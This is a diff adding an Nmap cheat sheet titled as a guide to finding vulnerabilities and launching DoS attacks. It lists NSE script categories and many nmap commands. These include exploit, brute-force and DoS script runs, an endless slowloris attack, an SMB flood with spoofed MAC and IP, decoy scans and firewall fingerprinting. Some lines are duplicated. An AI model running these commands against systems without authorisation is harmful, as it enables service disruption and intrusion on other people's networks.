@@ -1,0 +1,59 @@
+Use NMAP 7 to Discover Vulnerabilities, Launch DoS Attacks and More!
+
+Auth: Use to test whether you can bypass authentication mechanism
+Broadcast: Use to find other hosts on the network and automatically add them to scanning que.
+Brute: Use for brute password guessing.
+Discovery: Use to discover more about the network.
+Dos: Use to test whether a target is vulnerable to DoS
+Exploit: Use to actively exploit a vulnerability
+Fuzzer: Use to test how server responds to unexpected or randomized fields in packets and determine other potential vulnerabilities
+Intrusive: Use to perform more intense scans that pose a much higher risk of being detected by admins.
+Malware: Use to test target for presence of malware
+Safe: Use to perform general network security scan that's less likely to alarm remote administrators
+Vuln: Use to find vulnerabilities on the target
+
+nmap -Pn --script vuln <target.com or ip> <enter>
+nmap --script exploit -Pn <target.com or ip> <enter>
+nmap --script brute -Pn <target.com or ip> <enter>
+nmap --script dos -Pn <target.com or ip> <enter>
+nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
+
+nmap <scantype> IP address
+nmap 192.168.89.191 -p25-150
+nmap 192.168.89.0/24 -p80
+nmap -sS 192.168.89.191 -D 10.0.0.1,10.0.0.2,10.0.0.4
+nmap -sS -P0 192.168.89.191
+nmap -V 192.168.89.191
+nmap -sU 192.168.89.191
+nmap -sU --reason 192.168.89.191
+nmap -iL scanlist.txt
+nmap -sS 192.168.89.191 -oN portscan
+cat portscan.txt
+nmap -p80,443 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.detectBodyChanges" targetWebsite.com
+nmap -p80,443 --script http-waf-fingerprint targetWebsite.com
+nmap -p80,443 --script http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 targetWebsite
+nmap -p80,443 --script http-errors targetWebsite.com
+nmap -vv -p80,443 --script http-errors --script-args "httpspider.url=/docs/,httpspider.maxpagecount=3,httpspider.maxdepth=1" targetwebsite.com
+nmap -p80,443 --script dns-brute targetWebsite.com
+nmap -p80,443 --script dns-brute --script-args dns-brute.threads=25,dns-brute.hostlist=/root/Desktop/custom-subdomain-wordlist.txt targetWebsite.com
+nmap -p80,443 --script http-exif-spider targetWebsite.com
+nmap -p80,443 --script http-exif-spider --script-args="http.max-cache-size=99999999" targetWebsite.com
+locate *.nse
+locate *vuln*.nse
+nmap --script <scriptname> <host ip>
+nmap --script smb-check-vulns-nse 192.168.1.121
+nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p445 192.168.1.121
+nmap -script-help http-vuln-cve2013-0156.nse
+nmap -script smb-flood --spoof-mac <MAC address > -S <IP address> -p 445 -e eth0 -P0
+
+nmap -p80,443 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.detectBodyChanges" targetWebsite.com
+nmap -p80,443 --script http-waf-fingerprint targetWebsite.com
+nmap -p80,443 --script http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 targetWebsite
+nmap -p80,443 --script http-errors targetWebsite.com
+nmap -vv -p80,443 --script http-errors --script-args "httpspider.url=/docs/,httpspider.maxpagecount=3,httpspider.maxdepth=1" targetwebsite.com
+map -p80,443 --script dns-brute targetWebsite.com
+nmap -p80,443 --script dns-brute --script-args dns-brute.threads=25,dns-brute.hostlist=/root/Desktop/custom-subdomain-wordlist.txt targetWebsite.com
+nmap -p80,443 --script http-exif-spider targetWebsite.com
+nmap -p80,443 --script http-exif-spider --script-args="http.max-cache-size=99999999" targetWebsite.com
+
+
